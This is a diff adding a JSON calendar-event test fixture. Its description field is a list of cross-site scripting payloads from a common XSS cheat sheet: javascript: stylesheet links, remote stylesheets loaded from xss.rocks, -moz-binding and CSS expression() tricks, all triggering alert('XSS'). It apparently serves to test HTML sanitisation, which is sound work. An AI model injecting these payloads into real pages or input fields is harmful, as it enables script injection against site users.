@@ -1,0 +1,16 @@
+{
+  "id": "htmlxss6",
+  "type": "calendar",
+  "date": "2015-09-02",
+  "activity": "activitya",
+  "title": "some seminar of activity A",
+  "organization": "Some org",
+  "description":
+" JavaScript includes <BR SIZE=\"&{alert('XSS')}\"> , STYLE sheet <LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\"> , Remote style sheet <LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\"> Remote style sheet part 2 <STYLE>@import'http://xss.rocks/xss.css';</STYLE> Remote style sheet part 3 <META HTTP-EQUIV=\"Link\" Content=\"<http://xss.rocks/xss.css>; REL=stylesheet\"> Remote style sheet part 4 <STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE> STYLE Tags with Broken-up JavaScript for XSS <STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE> STYLE Attribute using a Comment to Break-up Expression <IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\"> IMG STYLE with Expression exp/*<A STYLE='no\\xss:noxss(\"*//*\");xss:ex/*XSS*//*/*/pression(alert(\"XSS\"))'>",
+  "url": "",
+  "location": "",
+  "startdate": "",
+  "enddate": "",
+  "updated": "",
+  "updatedby": ""
+}
